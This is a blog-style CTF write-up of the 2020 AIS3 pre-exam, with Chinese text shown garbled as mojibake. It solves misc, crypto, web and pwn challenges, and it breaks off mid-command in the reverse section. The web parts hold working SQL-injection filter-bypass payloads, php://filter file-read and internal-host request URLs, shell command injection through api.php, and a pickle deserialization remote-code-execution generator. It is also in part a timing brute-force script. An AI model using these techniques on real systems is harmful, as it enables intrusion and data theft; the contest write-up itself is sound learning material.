---
layout: post
title:  "2020 AIS3 pre-exam & MyFirstCTF"
date:   2020-06-31
tags:
  - CTF
  - AIS3
categories: writeup
---

## å‰è¨€

ç¬¬ä¸€æ¬¡æ­£å¼åƒåŠ CTFï¼ æ•´é«”ä¸‹ä¾†çš„æ„Ÿè¦ºç¸½è€Œè¨€ä¹‹æ˜¯éå¸¸çš„å……å¯¦ï¼Œåœ¨webæ–¹é¢çœ‹åˆ°äº†å¾ˆå¤šç¥å¥‡çš„æ±è¥¿ï¼Œå­¸åˆ°å¾ˆå¤šï¼Œç„¶è€Œpwnè·Ÿreverseé¡åŸºæœ¬ä¸Šçœ‹ä¸æ‡‚ï¼Œdiscordä¸Šé¢çš„äººéƒ½æ˜¯ç¥äººå•Š Q___Q 

åªèƒ½èªª GoogleçœŸçš„æ˜¯å¾ˆå¥½ç”¨XD
<!--description-->
<img src="/assets/scoreboard.png" style="zoom: 67%;" />

å®˜æ–¹Writeup:
- [Reverse](http://blog.terrynini.tw/tw/2020-AIS3-%E5%89%8D%E6%B8%AC%E5%AE%98%E6%96%B9%E8%A7%A3/)
- [Web](https://github.com/djosix/AIS3-2020-Pre-Exam)
- [Pwn](https://github.com/ss8651twtw/ais3-pre-exam-2020)
- [Misc](https://github.com/frozenkp/CTF/tree/master/2020/AIS3_pre-exam)
- [Crypto](https://maojui.me)

## Misc

---------------------------

### Misc - piquero

ä¸€å¼µåœ–ç‰‡ï¼Œç›²äººé»å­—ã€‚

ç›´æ¥ä¸Šgoogleåœ–ç‰‡æŸ¥å°ç…§è¡¨ï¼Œæ‹¿å¼µç´™ä¸€å€‹ä¸€å€‹å°ï¼Œå¤§å¯«å­—æ¯å’Œç¬¦è™Ÿæœƒå¤šç”¨ä¸€å€‹é»å­—ä¾†å€åˆ¥ï¼Œè »æœ‰è¶£çš„ã€‚

Flag:

```
AIS3{I_feel_sleepy_Good_Night!!!}
```

### Misc - Soy

çœ‹åˆ°discordè£¡å¥½å¤šäººéƒ½ç”¨æ‰‹è§£ï¼Œæˆ‘åœ¨é€™è£¡çœŸå¿ƒè¡¨é”ä½©æœ XD

æˆ‘æœä¸åˆ°QRcodeçš„æ¼”ç®—æ³•ï¼Œå€’æ˜¯æœåˆ°äº†å€‹å·¥å…·XD

<https://github.com/waidotto/strong-qr-decoder>

æŠŠèƒ½çœ‹åˆ°çš„çœ‹ä¸åˆ°çš„éƒ½é¤µçµ¦ä»–ï¼š

```
$ cat qrdata.txt
xxxxxxx---xxx-xx--xxxxxxx
x-----x--x-xx-xxx-x-----x
x-xxx-x-x--x--xx--x-xxx-x
x-xxx-x-----x---x-x-xxx-x
x-xxx-x---xxx-----x-xxx-x
x-----x--x-xxx-xx-x-----x
xxxxxxx-x-x-x-x-x-xxxxxxx
--------xxxx-xxxx--------
????xxxxxx--xx---xx---x--
????xx??x-------xxx--x---
???x????x----x--x-xx-x-xx
???????x-xx-xx-x--x-xx---
????????x-xx-x----xxxx-x-
???-x???-x---x----x--x-xx
???-xxxx-xx------xxx-x---
????----x--x-x-x-x-------
?????xx??x--x--xxxxxxx--x
--------x-x---x-x---xxxx-
xxxxxxx-x----x-xx-x-xx-xx
x-----x-xxx-xxx-x---x--x-
x-xxx-x-x-xx-x--xxxxx-x-x
x-xxx-x---x---------xxxxx
x-xxx-x-xx---------xx-x-x
x-----x-xxxxxxx---xx-x-x-
xxxxxxx-x---xx-xx---xx-xx
$ python qr.py qrdata.txt
Aï¿½S3{H0w_c4nYy0u_f1nd_me?!?!?!!m
```

æœ‰é»äº‚ç¢¼ï¼Œä¸éæ­£è§£flagæ˜¯:

```
AIS3{H0w_c4n_y0u_f1nd_me?!?!?!!}
```

### Misc - Karuego

åªçµ¦ä½ ä¸€å¼µæª”æ¡ˆä¸çŸ¥é“åœ¨å¤§ä»€éº¼çš„åœ–ç‰‡ï¼Œä¸Šç¶²ç¨å¾®æŸ¥äº†ä¸‹åœ–ç‰‡æ€éº¼è—è³‡æ–™ï¼Œå¹¾ä¹å…¨éƒ½æ˜¯èªªæŠŠzipæ¥åœ¨åœ–ç‰‡å¾Œé¢ï¼Ÿ

é‚£å°±ç›´æ¥è©¦è‘—è§£å£“ç¸®ï¼š

```bash
$ unzip Karuego.png
Archive:  Karuego.png
warning [Karuego.png]:  2059568 extra bytes at beginning or within zipfile
  (attempting to process anyway)
[Karuego.png] files/3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg password:
```

çœŸçš„æ˜¯ï¼Œè€Œä¸”é‚„æœ‰åŠ å¯†ã€‚å…ˆç”¨`dd`æŠŠzipéƒ¨ä»½æ‹¿å‡ºä¾†ï¼Œå†ä½¿ç”¨`fcrackzip`é…åˆrockyou.txtå»è©¦å¯†ç¢¼ï¼š

```shell
$ dd bs=2059568 skip=1 if=Karuego.png of=out.zip
0+1 records in
0+1 records out
1201353 bytes transferred in 0.004195 secs (286379068 bytes/sec)
$ fcrackzip -v -u -D -p rockyou.txt out.zip
'files/' is not encrypted, skipping
found file 'files/3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg', (size cp/uc 113020/113110, flags 9, chk 216f)
found file 'files/Demon.png', (size cp/uc 1087747/1092860, flags 9, chk 86e2)
checking pw luis99fer

PASSWORD FOUND!!!!: pw == lafire
```

è§£å£“ç¸®ä¹‹å¾Œå¯ä»¥å¾—åˆ°flagçš„åœ–ç‰‡ï¼š

![Demon](/assets/Demon.png)

### Misc - Saburo

é€£ä¸Šå»ï¼Œä¼ºæœå™¨æç¤º`Flag:`è®“ä½ è¼¸å…¥ï¼Œç„¶å¾Œæœƒè·‘å‡ºcpuæ™‚é–“ï¼Œæ‹¿flagçš„é–‹é ­`AIS3{`å»è©¦ï¼Œå¾ˆæ˜é¡¯æ™‚é–“è·Ÿå‰é¢å°äº†å¹¾å€‹å­—å…ƒç›´æ¥ç›¸é—œï¼Œåªæ˜¯æ¯å€‹å­—å…ƒæ™‚é–“éƒ½æœƒæœ‰ä¸å°‘èª¤å·®ï¼Œè¦è©¦å¤šæ¬¡å–å¹³å‡ã€‚

ç›´æ¥ä¸Špythonï¼š

```python
from pwn import *
import os

context.log_level = 'warning'
known = "AIS3{" 

chrs = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_}"

while True:
    c=0
    prev = 0
    st = "\n"
    while c<len(chrs):
        
        avg = 0
        log.warning(f'Trying {known+chrs[c]}')
        for i in range(15):
            print(i,end='')
            p = remote("60.250.197.227", 11001)
            p.recvuntil('Flag: ')
            p.sendline(known+chrs[c])
            s = p.recvline()
            avg += int(s[18:-14])
            p.close()

        avg = avg
        print(f'  avg time={avg}')
        st += f'{chrs[c]}: {avg}\n'
        flag=0
        if avg > prev:
            flag=1
            prev = avg
            largeind = c
        
        c+=1
        
    print(st)
    log.warning(f'largest char: {chrs[largeind]}, time={prev}')
    ans = input('Enter char, or left empty to use largest: ')
    ans = ans.strip('\n')
    if ans=="":
        known += chrs[largeind]
        log.warning(f'new char: [{chrs[largeind]}], time={prev}')
    else:
        known += ans
        log.warning(f'new char: {ans}')

    if known[-1] == '}':
        break

print(known)
```

ç¸½ä¹‹å°±æ˜¯æ¯å€‹å­—å…ƒè©¦15æ¬¡ï¼Œå–æœ€é•·çš„æ‹¿ä¾†è©¦ä¸‹ä¸€å€‹ã€‚æ‡‰è©²å¯ä»¥å†ç”¨threadé‡å¯«å„ªåŒ–ï¼Œä½†æ˜¯æˆ‘æ‡¶çš„å†è·‘ä¸€æ¬¡ï¼Œæ‰€ä»¥é€™è£¡æˆ‘å°±ä¸çµ¦flagäº†>_<

## Crypto

----------------------------------

### Crypto - T-Rex

çµ¦äº†å€‹æ–‡å­—æª”æ¡ˆï¼Œæ˜¯å€‹æ’ç‰ˆçš„å¾ˆæ¼‚äº®çš„å°ç…§è¡¨ï¼ŒåŠ ä¸Šä¸€å¤§ä¸²å­—å…ƒï¼Œé¡¯ç„¶æ˜¯è¦ä¸€å€‹ä¸€å€‹å°çš„Flag

codeç›´æ¥å¯«ä¸‹å»å°±å¾—åˆ°flag:

```
AIS3{TYR4NN0S4URU5_R3X_GIV3_Y0U_SOMETHING_RANDOM_5TD6XQIVN3H7EUF8ODET4T3H907HUC69L6LTSH4KN3EURN49BIOUY6HBFCVJRZP0O83FWM0Z59IISJ5A2VFQG1QJ0LECYLA0A1UYIHTIIT1IWH0JX4T3ZJ1KSBRM9GED63CJVBQHQORVEJZELUJW5UG78B9PP1SIRM1IF500H52USDPIVRK7VGZULBO3RRE1OLNGNALX}
```

 é€™å€‹æš´é¾å¾ˆG8 >_<

### Crypto - Brontosaurus

é¡Œç›®æç¤ºï¼šBrontosaurus peek at last yearâ€™s problems with a long neck and picked up "KcufsJ".

çµ¦äº†å€‹ä¸€å¤§ä¸²é¡¯ç„¶æ˜¯JSfuckçš„æª”æ¡ˆã€‚ä¸€é–‹å§‹æˆ‘é‚„æ²’çœ‹å‡ºé‚£å€‹KcufsJæ˜¯Jsfuckæ‹¼åï¼Œé‚„å»ä¸Šç¶²æŸ¥:man_facepalming:

æ‰€ä»¥å°±ç›´æ¥æŠŠæ•´å€‹æ±è¥¿åéä¾†ï¼Œä¸Ÿåˆ°ç€è¦½å™¨è£¡ï¼Œæœƒè¼¸å‡ºflag:

```
AIS3{Br0n7Os4uru5_ch3at_3asi1Y}
```

### Crypto - Octopus

æ‹¿åˆ°çš„ç¬¬ä¸€å€‹100åˆ†ä»¥ä¸Šçš„é¡Œç›® å¯æƒœç¶­åŸºçœ‹å¤ªæ…¢æ²’æ‹¿åˆ°é¦–æ®º >_<

é¡Œç›®æåˆ°[BB84 quantum key distribution](https://zh.wikipedia.org/wiki/é‡å­å¯†é‘°åˆ†ç™¼)é€™æ±è¥¿ï¼ˆé…·çˆ†â€‹â€‹ï¼‰ï¼Œçµ¦äº†ä¸€å€‹Pythonç¨‹å¼å’Œé€™å€‹ç¨‹å¼åŸ·è¡Œå‡ºä¾†çš„çµæœã€‚

çœ‹æ‡‚ç¶­åŸºç™¾ç§‘ä¹‹å¾Œå°±å¯ä»¥å¯«ç¨‹å¼äº†ï¼Œåšå‡ºå…±åŒå¯†é‘°å–å‰ 400 å€‹ bit ç„¶å¾Œè·Ÿä»–çµ¦çš„ 400 bit ä½œ XOR å°±æ˜¯flagäº†ã€‚

```python
import random
soriB = "'+', '+', '+', '+', '+', '+', 'x', '+', 'x', '+', ....ï¼ˆBasisï¼‰"
smyB = "'+', 'x', '+', '+', 'x', '+', 'x', '+', 'x', 'x', ....ï¼ˆMy Basisï¼‰"
sqb = "1j, 1j, (1+0j), (1+0j), 1j, 1j, (0.707+0.707j), (1+0j), .... (Qubits)"

oriB = soriB.split(", ")
print(oriB)
for i in range(len(oriB)):
    if oriB[i] == "'+'":
        oriB[i] = 0
    else:
        oriB[i] = 1

myB = smyB.split(", ")
for i in range(len(myB)):
    if myB[i] == "'+'":
        myB[i] = 0
    else:
        myB[i] = 1

qb = sqb.split(', ')
for i in range(len(qb)):
    if qb[i] == '(1+0j)':
        qb[i] = 'u'
    elif qb[i] == '1j':
        qb[i] = 'r'
    elif qb[i] == '(0.707+0.707j)':
        qb[i] = 'ru'
    elif qb[i] == '(0.707-0.707j)':
        qb[i] = 'rd'


def qb2bit(qb):
    if qb in ['u','ru']:
        return 0
    else:
        return 1

stream = ""
for i in range(1024):
    if oriB[i] == myB[i]:
        stream+=str(qb2bit(qb[i]))

key = int('0b' + stream[:400],2)
print(key)
alter = 0b1101000110100011011100111001111001000011111101101101010010000111111001000100010111000111100101000101100101010111110001101110100100110110011100010010110000100000001000001010011010010011111001101001010000010010110000100110100111110001000110101100000111100010010010001110010100101000011100101100010110100101010110100100111001111101100110010000001010111010010101001110110001011001001110100110100011000100
print(alter)
flag = key ^ alter
print(bytes.fromhex(hex(flag).strip('0x')).decode('UTF-8'))
```

å¾—åˆ°flag:

```
AIS3{EveryONe_kn0w_Quan7um_k3Y_Distr1but1on--BB84}
```

## Web

----

### Web - Shark

æç¤ºèªªæ˜¯å»å¹´çš„è€ƒå¤é¡Œï¼Œæ‰€ä»¥å°±ç›´æ¥æ‹¿ä¾†ç”¨wwww

å…ˆç”¨ä»–çµ¦çš„pathçœ‹index.php:

```php
<?php

    if ($path = @$_GET['path']) {
        if (preg_match('/^(\.|\/)/', $path)) {
            // disallow /path/like/this and ../this
            die('<pre>[forbidden]</pre>');
        }
        $content = @file_get_contents($path, FALSE, NULL, 0, 1000);
        die('<pre>' . ($content ? htmlentities($content) : '[empty]') . '</pre>');
    }

?><!DOCTYPE html>
<head>
    <title>ğŸ¦ˆğŸ¦ˆğŸ¦ˆ</title>
    <meta charset="utf-8">
</head>
<body>
    <h1>ğŸ¦ˆğŸ¦ˆğŸ¦ˆ</h1>
    <a href="?path=hint.txt">Shark never cries?</a>
</body>

```

é–‹é ­ä¸èƒ½æ˜¯`/`å’Œ`.`ï¼Œæ‰€ä»¥ç”¨php filter ç¹éå»ï¼Œçœ‹/proc/net/fib_trieï¼Œçœ‹å»å¹´çš„writeupå®˜æ–¹é‚„çµ¦äº†[é€™å€‹ç¶²ç«™](http://wp.blkstone.me/2018/06/abusing-arbitrary-file-read/#421)è®“ä½ æ‰¾æ±è¥¿ç©wwww

```
https://shark.ais3.org/?path=php://filter/convert.base64-encode/resource=/proc/net/fib_trie
```

```
Main:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /32 link BROADCAST
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 172.22.0.0/16 2 0 2
        +-- 172.22.0.0/30 2 0 2
           |-- 172.22.0.0
              /32 link BROADCAST
              /16 link UNICAST
           |-- 172.22.0.3  <--- ä¸»æ©Ÿ
              /32 host LOCAL
        |-- 172.22.255.255
           /32 link BROADCAST
Local:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
```

çœ‹ /proc/net/arp ä¹Ÿè¡Œå¾—é€šï¼Ÿ

```
IP address       HW type     Flags       HW address            Mask     Device
172.22.0.11      0x1         0x0         00:00:00:00:00:00     *        eth0
172.22.0.14      0x1         0x0         00:00:00:00:00:00     *        eth0
172.22.0.17      0x1         0x0         00:00:00:00:00:00     *        eth0
172.22.0.20      0x1         0x0         00:00:00:00:00:00     *        eth0
172.22.0.1       0x1         0x2         02:42:c9:d4:ce:4b     *        eth0
172.22.0.4       0x1         0x0         00:00:00:00:00:00     *        eth0
172.22.0.15      0x1         0x0         00:00:00:00:00:00     *        eth0
172.22.0.18      0x1         0x0         00:00:00:00:00:00     *        eth0
172.22.0.21      0x1         0x0         00:00:00:00:00
```

ä¸çŸ¥é“ï¼Œæˆ‘å¤ªèœçœ‹ä¸æ‡‚ã€‚ä½†ç¸½ä¹‹å¦å¤–ä¸€å€‹ä¸»æ©Ÿæ˜¯åœ¨ 172.22.0.2ã€‚

ç›´æ¥`/?path=http://172.22.0.2/flag`å°±å¾—åˆ°flag:

```
AIS3{5h4rk5_d0n'7_5w1m_b4ckw4rd5}
```

### Web - Owl

é¡Œç›®æç¤ºï¼š1. ç¶²é è£¡æœ‰æç¤º 2.é€™é¡Œæ ¹Cryptoè£¡çš„turtleæ˜¯æ··åˆé¡Œ

é¡Œç›®é»é€²å»æ˜¯ä¸€å€‹ç™»å…¥ç•«é¢ï¼Œå¯ä»¥æ‰“å¸³è™Ÿå’Œå¯†ç¢¼ï¼Œç¶²é æœ€ä¸Šé¢å¯ä»¥åç™½çœ‹æç¤ºï¼šã€Œguess the stupid account/passwordã€

ä¸€é–‹å§‹æˆ‘ä¸çŸ¥é“é€™æ˜¯ä»€éº¼æ„æ€ï¼Œæ‰€ä»¥æˆ‘è·‘å»çœ‹turtleé‚£é¡Œï¼Œé¡Œç›®å¯ä»¥çµ¦å€‹sourceåƒæ•¸çœ‹åŸå§‹ç¢¼ã€‚

ç›´æ¥ççŒœowlæ˜¯å¦ä¹Ÿèƒ½ç”¨åŒä¸€æ‹›ï¼Œçµæœé‚„çœŸçš„å¯ä»¥ XD

æ‹¿åˆ°äº†åŸå§‹ç¢¼ï¼Œä¸€çœ‹å°±çŸ¥é“æ˜¯è¦ç©SQL injectionï¼Œç„¶è€Œä»–æœ‰åšä¸€äº›inputéæ¿¾ï¼š

```php
// Get rid of sqlmap kiddies
if (stripos($_SERVER['HTTP_USER_AGENT'], 'sqlmap') !== false) {
  redirect('/', "sqlmap is child's play");
}

// Get rid of you
$bad = [' ', '/*', '*/', 'select', 'union', 'or', 'and', 'where', 'from', '--'];
$username = str_ireplace($bad, '', $username);
$username = str_ireplace($bad, '', $username);

// Auth
$hash = md5($password);
$row = (new SQLite3('/db.sqlite3'))
  ->querySingle("SELECT * FROM users WHERE username = '$username' AND password = '$hash'", true);
if (!$row) {
  redirect('/', 'login failed');
}
```

æ³¨æ„åˆ°ä»–æœƒæŠŠç©ºæ ¼åˆªæ‰ï¼Œæˆ‘å€‘å¯ä»¥ç”¨`/**/`ä¾†ä»£æ›¿ç©ºæ ¼ï¼Œä½†åœ¨é€™è£¡è¦æŠŠå®ƒå¯«æˆ`/oorr**oorr/`ï¼Œè®“ä¸‹é¢å…©æ¬¡å–ä»£åˆªæ‰oorrçš„éƒ¨åˆ†

é‚„æœ‰`--`ä¹Ÿè¢«éæ¿¾æ‰äº†ï¼Œä½†é€™è£¡å› ç‚ºä»–æ˜¯åœ¨ç¯©é¸é †åºçš„æœ€å¾Œä¸€å€‹ï¼Œæ‰€ä»¥æ²’è¾¦æ³•ç”¨é€™ä¸€æ‹›ï¼Œä¸éå¹¸å¥½`/*`ä¹Ÿè¡Œå¾—é€šï¼Œåªæ˜¯è¦æ›æˆ`/oorr*`

é–‹å§‹injectå•¦ï¼Œå…ˆè©¦è©¦çœ‹ç™»å…¥ï¼š

```
x'OoorrR''=''/oorr*   ( payload: x'OR''=''/* )
```

é€²å»ä¹‹å¾Œç•«é¢ä¸Šæ–¹æœ‰å€‹åç™½çš„é€£çµï¼Œæ˜¯å‰›å‰›æˆ‘å€‘å·²ç¶“çœ‹åˆ°çš„åŸå§‹ç¢¼ !??

çœ‹ä¾†å…¶å¯¦æ­£ç¢ºè·¯ç·šæ˜¯è¦å…ˆäº‚çŒœå¸³è™Ÿå¯†ç¢¼å†é€²ä¾†çœ‹åŸå§‹ç¢¼å‘¢ (ËŠÂ· w Â·`)

å¥½å§é‚£æˆ‘å€‘å°±ä¾†çœ‹ä¸€ä¸‹å¸³è™Ÿå¯†ç¢¼ï¼Œç¶²ç«™æœƒæŠŠqueryçµæœç¬¬äºŒæ¬„ï¼š

```
x'/oorr**oorr/unoorrion/oorr**oorr/seloorrect/oorr**oorr/1,group_concat(username),1/oorr**oorr/frfrfromomom/oorr**oorr/users/oorr*
(payload: x' union select 1,group_concat(username),1 from users/* )
```

é€™è£¡fromä¸ç”¨oorrä¾†è—æ˜¯å› ç‚ºå‰é¢ç¯©é¸é †åºçš„é—œä¿‚ã€‚å…¨éƒ¨çš„å¸³è™Ÿï¼š

```
root,admin,test,guest,info,adm,mysql,kaibro,oracle,ftp,pi,puppet,ansible,maojui,ec2,djosix,vagrant,azureuser,python,user,username,administrator
```

ç”¨åŒæ¨£çš„æ–¹å¼å¯ä»¥æ‹¿åˆ°å¯†ç¢¼çš„md5 hashï¼Œåªæ˜¯passwordè¦æ›æˆpasswooorrrdï¼ˆXDDDï¼‰

æŠŠhashä¸Ÿåˆ°ç¶²è·¯å·¥å…·å¯ä»¥æ‰¾åˆ°ä¸å°‘å€‹å¯†ç¢¼ï¼Œæ¯”å¦‚èªªadminçš„å¯†ç¢¼ä¹Ÿæ˜¯admin... ä½†æ˜¯æ‹¿åˆ°é€™äº›æ²’ä»€éº¼ç”¨ï¼Œæ‰€ä»¥æ¥ä¸‹ä¾†æª¢æŸ¥usersè£¡é ­æœ‰æ²’æœ‰å…¶ä»–æ¬„ä½ï¼š

```
x'/oorr**oorr/unoorrion/oorr**oorr/seloorrect/oorr**oorr/1,sql,1/oorr**oorr/frfrfromomom/oorr**oorr/sqlite_master/oorr**oorr/whefrfromomre/oorr**oorr/name='users'/oorr*
payload: x' union select 1,sql,1 from sqlite_master where name='users'/*)
results: CREATE TABLE users ( id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT )
```

é€™æ¨£å­å¯ä»¥çŸ¥é“usersè£¡é ­å„å€‹æ¬„ä½çš„åå­—ï¼š`id, username password`ï¼Œç„¶å¾Œå°±å¯ä»¥ä¸€å€‹ä¸€å€‹çœ‹ã€‚ï¼ˆéƒ½æ²’æœ‰flag @_@ï¼‰

æ—¢ç„¶é¡Œç›®æç¤ºflagå°±åœ¨è³‡æ–™åº«è£¡ï¼Œä½†æ˜¯usersè£¡é ­åˆæ²’æœ‰ï¼Œåªèƒ½èªªæ˜flagè—åœ¨å¦ä¸€å€‹tableè£¡å•¦ï½

å°‹æ‰¾è³‡æ–™åº«è£¡æ‰€æœ‰tableï¼š

```
x'/oorr**oorr/unoorrion/oorr**oorr/seloorrect/oorr**oorr/1,group_concat(name),1/oorr**oorr/frfrfromomom/oorr**oorr/sqlite_master/oorr**oorr/whefrfromomre/oorr**oorr/type='table'/oorr*
payload: x' union select 1,group_concat(name),1 from sqlite_master where type='table'/*
results: users,sqlite_sequence,garbage
```

`sqlite_sequence`æ˜¯sqliteè‡ªå‹•å‰µå»ºçš„ï¼Œç”¨ä¸å¤ªåˆ°ï¼Œflagä¸€å®šåœ¨garbageè£¡é¢ã€‚ä½¿ç”¨å‰é¢çœ‹column nameçš„æ–¹æ³•çœ‹garbageï¼Œå¾—åˆ°`CREATE TABLE garbage ( id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, value TEXT )`ï¼Œä¸€æ¨£ä¸€å€‹ä¸€å€‹çœ‹ï¼Œæœ€å¾Œçœ‹åˆ°åœ¨valueè£¡é ­ï¼š

![owl](/assets/owl.png)

ã„ã„ï¼Œåæ­£æˆ‘ä¹Ÿä¸æœƒç”¨sqlmapã€‚ç¬¬ä¸€æ¬¡è§£é–‹SQL-Içš„é¡Œç›®çœŸçš„æ˜¯å¥½çˆ½A_A

æœ¬é¡Œå¿ƒå¾—ï¼šé‡åˆ°sqliteçš„é¡Œç›®ï¼Œç›´æ¥æƒ³è¾¦æ³•è®€sqlite_masterå°±å¥½äº†ã€‚

### Web - Squirrel

ä¸€é»é€²å»ç™¼ç¾ä¸€å †æ¼‚ä¾†æ¼‚å»çš„æ¾é¼ ï¼Œåº•ä¸‹æœ‰ä¸€äº›çœ‹ä¸æ‡‚çš„æ±è¥¿ï¼š

![squirrel](/assets/squirrel.png)

ç›´æ¥çœ‹åŸå§‹ç¢¼ï¼Œä»–æ˜¯é€é`api.php`å»è®€ä¸»æ©Ÿä¸Šçš„`/etc/passwd`ï¼Œçœ‹ä¾†å¯ä»¥è®€æ‰€æœ‰æª”æ¡ˆï¼ï¼Ÿç›´æ¥å«ä»–è®€`api.php`ï¼š

```
/api.php?get=api.php

{"output":"<?php\n\nheader('Content-Type: application\/json');\n\nif ($file = @$_GET['get']) {\n    $output = shell_exec(\"cat '$file'\");\n    \n    if ($output !== null) {\n        echo json_encode([\n            'output' => $output\n        ]);\n    } else {\n        echo json_encode([\n            'error' => 'cannot get file'\n        ]);\n    }\n} else {\n    echo json_encode([\n        'error' => 'empty file path'\n    ]);\n}\n"}
```

çœ‹ä¾†é€™å€‹phpç›´æ¥æŠŠä½ çµ¦çš„è·¯å¾‘ä¸Ÿé€²`shell_exec("cat '$file'")`è£¡é ­ï¼Œé€™ç›¸ç•¶æ–¼çµ¦äº†æˆ‘å€‘shellï¼š

```
/api.php?get=';ls;a='
{"output":"api.php\ncss\nindex.html\njs\n"}
/api.php?get=';cd ..;ls;a='
{"output":"html\n"}
/api.php?get=';cd ../..;ls;a='
{"output":"backups\ncache\nlib\nlocal\nlock\nlog\nmail\nopt\nrun\nspool\ntmp\nwww\n"}
/api.php?get=';cd ../../..;ls;a='
{"output":"5qu1rr3l_15_4_k1nd_0f_b16_r47.txt\nbin\nboot\ndev\netc\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n"}
```

å°±æ‹¿åˆ°flagæƒ¹ï¼Œæ¾é¼ è »å¯æ„›çš„ww

---------------------------------------------------

### Web - Snake

é€™é¡Œæˆ‘æ˜¯åœ¨çµæŸä¹‹å¾Œæ‰çœ‹åˆ°çš„ï¼ŒåŸä¾†å…¶å¯¦å¾ˆç°¡å–®QwQ

é¡Œç›®çµ¦çš„pythonï¼Œæœƒè®€ç¶²å€çš„dataåƒæ•¸ï¼Œbase64è§£ç¢¼ä¹‹å¾Œä¸Ÿçµ¦pickle.loads()ï¼š

```python
from flask import Flask, Response, request
import pickle, base64, traceback

Response.default_mimetype = 'text/plain'

app = Flask(__name__)

@app.route("/")
def index():
    data = request.values.get('data')
    
    if data is not None:
        try:
            data = base64.b64decode(data)
            data = pickle.loads(data)
            
            if data and not data:
                return open('/flag').read()

            return str(data)
        except:
            return traceback.format_exc()
        
    return open(__file__).read()
```

å¼„äº†å¥½å°±æ‰ç™¼ç¾é‚£å€‹`if data and not data`æ ¹æœ¬åªæ˜¯ä¾†å‘Šè¨´ä½ flagåœ¨å“ªè£¡è€Œå·²=_=

å…¶å¯¦é€™é¡Œçš„è€ƒé»åœ¨æ–¼`pickle.loads()`é€™å€‹å‡½å¼æœ‰æ¼æ´ï¼Œå¦‚æœæ”¾å…¥ä¸€å€‹è¨­è¨ˆéçš„classå°±å¯ä»¥åŸ·è¡Œä»»æ„pythonå‡½å¼ã€‚åƒé€™æ¨£ï¼š

```python
import pickle
import pickletools
from base64 import b64encode as b64
import subprocess

cmd = input('enter command\n$ ').strip('\n')
class Exploit():
    def __reduce__(self):
        
        command = ("__import__('os').popen('"+ cmd +"').read()")

        return (eval, (command, ))

pickled = pickle.dumps(Exploit())
print(b64(pickled))
```

è®“`__reduce__`å‡½å¼å‚³å›ä¸€å€‹tupleï¼Œå…§åŒ…å«è¦åŸ·è¡Œçš„å‡½å¼åŠ ä¸Šä¸€å€‹tupleï¼ŒåŸ·è¡Œ`pickle.loads()`æ™‚å°±æœƒæŠŠtupleè£¡çš„æ±è¥¿ç•¶ä½œåƒæ•¸çµ¦ä½ çš„å‡½å¼åŸ·è¡Œã€‚

é€™è£¡å¼„é‚£éº¼éº»ç…©æ˜¯å› ç‚ºåŸé¡Œç›®æ²’æœ‰`import os`ï¼Œç¸½ä¹‹é‚£å€‹å­—ä¸²ä¸Ÿçµ¦`eval`åŸ·è¡Œä¹‹å¾Œå°±æœƒç”¨shellåŸ·è¡Œä½ è¦çš„æŒ‡ä»¤ï¼Œç„¶å¾ŒæŠŠçµæœå‚³å›stdoutã€‚æ¯”å¦‚è¦çœ‹åˆ°flagæ˜¯ä»€éº¼ï¼Œåªè¦çµ¦ä»–å€‹`cat /flag`å°±æœ‰äº†ï¼š

```
AIS3{7h3_5n4k3_w1ll_4lw4y5_b173_b4ck.}
```

## pwn

-----------------

### pwn - BOF

æˆ‘å»¢ï¼Œæ‰€ä»¥æˆ‘pwnåªè§£çš„é–‹é€™å€‹ç°½åˆ°é¡Œ :sweat:

ç¶“å…¸çš„BOFï¼Œç¨‹å¼é€²å…¥é‚„æœƒå¾ˆé„™è¦–çš„èªªé€™é¡Œå¾ˆç°¡å–®ï¼š

```
ğŸ‘» They said there need some easy challenges, Okay here is your bof, but you should notice something in ubuntu 18.04.
```

ç¨å¾®googleä¸€ä¸‹ä¹‹å¾ŒçŸ¥é“é€™æ˜¯æŒ‡åœ¨é ç«¯å¯¦æ–½bofæ”»æ“Šéœ€è¦æ¯”è‡ªå·±æ¸¬è©¦å¤šåŠ 8 byteï¼Œé›–ç„¶æˆ‘çœŸçš„ä¸çŸ¥é“ç‚ºä»€éº¼

ç›´æ¥æŠŠç¨‹å¼ä¸Ÿåˆ°Ghidraè£¡çŸ¥é“bufferé•·`0x30`ï¼Œå¾Œå°åœ¨`0x400688`ï¼Œç›´æ¥ä¸Ÿé€²pwntoolsæ‹¿åˆ°flagï¼š

```
AIS3{OLd_5ChOOl_tr1ck_T0_m4Ke_s7aCk_A116nmeNt}
```

## Reverse

----

### Reverse - TsaiBro

æ‹¿åˆ°ä¸€å€‹åŸ·è¡Œæª”ã€ä¸€å€‹æ–‡å­—æª”ã€‚å¯ä»¥çŒœæ¸¬æ–‡å­—æª”æ˜¯æ‹¿æŸå€‹å­—ä¸²è¼¸é€²å»ä¹‹å¾Œå‡ºä¾†çš„çµæœã€‚

æ‹¿ghidraé–‹åŸ·è¡Œæª”ï¼Œè½‰æ›éç¨‹å®Œå…¨çœ‹ä¸æ‡‚ï¼Œä¸éçµ¦å¹¾å€‹inputç©ä¸€ä¸‹ä¹‹å¾Œï¼Œçœ‹èµ·ä¾†æ˜¯ä¸€å€‹å­—å…ƒå¯ä»¥å°æ‡‰åˆ°å…©å€‹ã€Œç™¼è²¡ã€ï¼Œé»çš„æ•¸é‡åªè·Ÿå­—å…ƒæœ‰é—œä¿‚ï¼Œæ‰€ä»¥å°±æš´åŠ›å°ç…§è§£ä¸‹å»ï¼š

```bash
$ ./tsaibro ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgjijklmnopqrstuvwxyz1234567890_{}
